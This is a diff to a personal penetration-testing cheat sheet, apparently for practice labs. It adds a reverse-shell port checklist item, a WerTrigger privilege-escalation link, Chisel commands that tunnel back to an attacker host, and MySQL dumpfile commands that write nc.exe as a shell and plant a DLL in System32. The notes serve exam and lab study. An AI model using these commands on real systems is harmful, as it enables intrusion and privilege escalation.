@@ -1,5 +1,5 @@
 # FEEL LIKE STUCK???
-- Did we try reverse shell with port with 443,80? (Learn this from PG Practice Helpdesk)
+- Did we try reverse shell with port with 443,80,445? (Learn this from PG Practice Helpdesk)
 - Did we create correct revshell for the victim architecture?
 - Did we try creating our own account on web service?
 - Did we search with version number?
@@ -7,6 +7,7 @@
 - Did we search port number with + exploit?
 - Did we submit form using burp suite so we can see what we're submitting?(not everything is displayed)
 - Did we run nikto?(There might be webdav hidden)
+- Can our current system has File Write permission as system?(WerTrigger: https://github.com/sailay1996/WerTrigger)
 
 
 # Default Credentials
@@ -706,6 +707,23 @@ zip2john sitebackup3.zip > zip.hash
 ```bash
 # Cross compile for 32bit windows system
 i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+```
+
+## Chisel
+```bash
+.\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+.\chisel.exe client 192.168.213.128:8000 R:1080:socks
+
+```
+
+
+## MYSQL
+```bash
+mysql -u root -h 127.0.0.1
+select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
+select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+
 ```
 
 
